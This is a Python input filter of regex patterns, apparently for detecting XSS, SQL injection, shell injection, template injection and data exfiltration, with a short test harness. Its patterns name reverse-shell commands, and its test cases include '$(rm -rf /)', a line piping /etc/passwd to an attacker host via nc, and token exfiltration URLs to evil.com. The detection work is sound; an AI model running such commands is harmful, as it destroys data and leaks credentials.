import re
import unicodedata

exploit_patterns = [
    # ── XSS ────────────────────────────────────────────────────────
    r"<\s*s\s*c\s*r\s*i\s*p\s*t[^>]*>.*?</\s*s\s*c\s*r\s*i\s*p\s*t\s*>",          # classic script tag, whitespace tolerant
    r"javascript:[a-zA-Z]",                # javascript: URI
    r"<[a-zA-Z]+[^>]+on\w+\s*=\s*['\"]?",  # event handlers (onerror, onload, onclick, etc.)
    r"<(img|svg|iframe|embed|object|video|audio|source|body|input|details|marquee|isindex)[^>]+(?:src|href|action|data|background)\s*=\s*['\"]?(?:javascript|data:|vbscript)",  # tag-based XSS
    r"<(svg|math)[^>]*>.*?</(svg|math)>",  # SVG/MathML XSS
    r"expression\s*\(",                    # CSS expression
    r"url\s*\(\s*['\"]?javascript:",       # CSS url() XSS
    # ── SQLi ───────────────────────────────────────────────────────
    r"DROP\s+TABLE\s+[a-zA-Z0-9_]+",       # DROP TABLE
    r"DELETE\s+FROM\s+[a-zA-Z0-9_]+",      # DELETE FROM
    r"UNION\s+SELECT\s+",                   # UNION SELECT
    r";\s*--",                             # comment terminator
    r"(?:ALTER|TRUNCATE|INSERT\s+INTO)\s+[a-zA-Z0-9_]+", # DDL/DML
    # ── Shell / Command Injection ───────────────────────────────
    r"nc\s+-e\s+",                          # netcat reverse shell
    r"bash\s+-i\s+>&",                      # bash reverse shell
    r"\bwget\s+https?://",                  # wget download
    r"\bcurl\s+.{0,80}https?://",            # curl download (with any flags)
    r"powershell\s+-(enc|exec|command|ep)\b", # PowerShell encoded/exec
    r"python\s+-c\s+['\"]import\s+(?:os|subprocess|socket)", # Python exec
    r"\b(?:chmod|chown)\s+[0-7]{3,4}\s+",  # chmod file
    # NEW Shell / Command Injection
    r"\$\([^)]+\)",                        # command substitution $()
    r"`[^`]+`",                            # backtick execution
    r"\|\s*(?:nc|curl|wget|bash|sh|zsh|python|perl|ruby)\b", # Pipe chained commands
    # ── SSTI / Template Injection ──────────────────────────────
    r"\{\{.*?(?:__class__|__mro__|__subclasses__|config|lipsum).*?\}\}",  # Jinja2 SSTI
    # ── Path Traversal ─────────────────────────────────────────
    r"(?:\.\.[\\/]){2,}",                  # ../../ traversal
    # ── LDAP Injection ─────────────────────────────────────────
    r"[()&|!]\s*\(\s*[a-zA-Z]+=\*\)",     # LDAP wildcard
    # ── Exfiltration ─────────────────────────────────────────
    r"https?://[^>\"\s]+\?(?:d|data|secret|token|key|cookie|session)=[^>\"\s]+", # URL exfiltration heuristic
    r"!\[[^\]]*\]\(\s*https?://[^)]+\?(?:d|data|secret|token|key|cookie|session)=[^)]+\)", # Markdown image exfil heuristic
]

def test(content):
    content = unicodedata.normalize('NFKC', content)
    content_no_whitespace = content.replace(' ', '').replace('\n', '').replace('\r', '').replace('\t', '')
    
    # We can use content_no_whitespace for XSS script tag to be completely robust
    if re.search(r"<script[^>]*>.*?</script>", content_no_whitespace, re.IGNORECASE | re.DOTALL):
        return "BLOCKED", "Whitespace-agnostic script tag"
        
    for exp in exploit_patterns:
        if re.search(exp, content, re.IGNORECASE | re.DOTALL):
            return "BLOCKED", exp
    return "SAFE", None

cases = [
    ("XSS script tag",         "<script>alert(1)</script>"),
    ("Script split newline",   "<scr\nipt>alert(1)</script>"), 
    ("Cmd substitution $()",   "Run this: $(rm -rf /)"),
    ("Cmd substitution backtick", "Execute: `whoami`"),
    ("Cmd with newline",       "echo hello\n$(rm -rf /)"),
    ("Pipe to nc",             "cat /etc/passwd | nc evil.com 1234"),
    ("URL exfil",              "Visit https://evil.com/steal?data=TOKEN"),
    ("Markdown exfil",         "![img](https://evil.com/exfil?d=SECRET)"),
    ("Normal URL",             "See https://docs.python.org/search?q=test for details"), 
    ("Normal URL 2",           "https://example.com/api?id=123"),
]

for label, payload in cases:
    print(f"{label}: {test(payload)}")
